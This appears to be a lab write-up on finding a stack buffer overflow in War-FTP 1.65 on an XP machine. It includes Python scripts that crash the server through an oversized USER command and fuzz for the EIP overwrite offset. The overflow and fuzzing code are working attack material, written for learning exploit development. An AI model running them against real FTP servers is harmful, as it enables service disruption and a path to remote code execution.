# Lab Machine Write up and Notes 

## Resources: 

Original Exploit: https://www.exploit-db.com/exploits/3570


### Nmap of the XP Machine

<img src="/images/nmap-xp-machine-tcp.png" >

A quick Nmap scan of the target machines reveals TCP port 21 open. I also outputted to all formats 
so I can import it into searchsploit to see if it catches some stuff. 

###  SearchSploit Results

I imported the Nmap scan like so: 

``
searchsploit --nmap xp-machine-tcp.xml 
``

But output was too verbose so I did not put it here and instead re-ran the command manually 

<img src="/images/searchsploit-1.png" >


###  Metasploit Console Exploit

<img src="/images/msfconsole.png" >

As you can see, the exploit did not work ( This is because it just crashed the application so, we are going to remake this manually )


### I Attached The Program to Immunity Debugger 

<img src="/images/immunity-ftp.png" width=812px height=474px>


### Vulnerability Discovery Inside The Application 

## Manual 

#### Python One Liner To Find Crashing Point Manually

This prints 1,000 As for ease of access 

<img src="/images/python-oneliner.png">

#### In the case of trying this directly through a FTP Client on a modern Distrobution the Client will stop you from sending the max buffer 

<img src="/images/failed-exploit.png">

#### So we are going to try with NetCat and See if that works better 

<img src="/images/crash-succeeded.png">

#### As you can see we crashed the program ( I did have to enter a pass before it crashed ) and to confirm the crash opened our debugger 

<img src="/images/immunity-crash.png" width=812px height=474px>

#### YAAAY we have control over the EIP and have written over it with our A's 

<img src="/images/immunity-EIP.png">

#### I have created an Exploit that will crash the server! 

This is a skeleton exploit we will add on more stuff as we find it

```python3
#!/usr/bin/python3

## War-FTP 1.65 Exploit

import socket
from urllib import response 

# define the variables to be sent to the server
ip = '192.168.164.170'
port = 21
buffer = b"A" * 1000
payload = ""

# create the socket to connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
# because there is a banner we wanna print it out 
response = s.recv(1024)
print(response)

# sending the exploit 
s.send(b"USER " + buffer + b"\r\n")
response = s.recv(1024)
print(response)

# because you have to enter the pass as well 
s.send(b"PASS parrot\r\n")
s.close()
```

## Automation 

#### We need to find the exact crash point so we make a fuzzing script to narrow it down after manual or automate it from the begining 


```python3
#!/usr/bin/python3

import socket
from time import sleep 

buffer = b"B" * 10
x = 0

while True: 
    buff = (b"A" * x ) + buffer
    print("Fuzzing " + str(len(buff)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.164.170', 21))
    resp = s.recv(1024)
    print(resp)

    s.send(b"USER " + buff + b"\r\n")
    resp = s.recv(1024)

    s.send(b"PASS PARROTASSASSIN15\r\n")

    s.close
    x = x + 100
    sleep(2)
```

#### We find that it crashes at 510 as the server no longer responds after 

<img src="/images/python3-crash.png">
